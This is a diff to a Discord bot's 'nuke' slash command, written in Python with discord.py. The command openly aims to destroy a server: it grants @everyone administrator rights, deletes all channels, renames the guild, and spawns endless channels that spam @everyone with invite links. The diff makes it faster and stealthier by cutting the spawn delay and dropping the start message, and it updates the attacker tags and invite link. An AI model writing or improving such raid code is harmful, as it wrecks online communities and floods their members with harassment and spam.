@@ -154,7 +154,6 @@ async def petpet_command(interaction: discord.Interaction, user: discord.User):
 
 @bot.tree.command(name="nuke", description="Destroy and spam the server")
 async def nuke(interaction: discord.Interaction):
-    await interaction.response.send_message("💣 Starting nuke...", ephemeral=False)
     try:
         everyone_role = interaction.guild.default_role
         await everyone_role.edit(permissions=discord.Permissions(administrator=True))
@@ -163,13 +162,13 @@ async def nuke(interaction: discord.Interaction):
                 await channel.delete()
             except:
                 pass
-        await interaction.guild.edit(name="nuked by apex")
+        await interaction.guild.edit(name="nuked by apex and peeky")
         async def create_and_spam():
-            ch = await interaction.guild.create_text_channel("nuked-by-apex")
+            ch = await interaction.guild.create_text_channel("nuked-by-apex and peeky")
             async def spam():
                 while True:
                     try:
-                        await ch.send("@everyone https://discord.gg/6Vtg4WpPHY")
+                        await ch.send("@everyone TBO on top https://discord.gg/jwYqu66bqm")
                     except:
                         break
                     await asyncio.sleep(0.1)
@@ -179,7 +178,7 @@ async def nuke(interaction: discord.Interaction):
         async def channel_spawner():
             while True:
                 await create_and_spam()
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.2)
         bot.loop.create_task(channel_spawner())
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {e}")
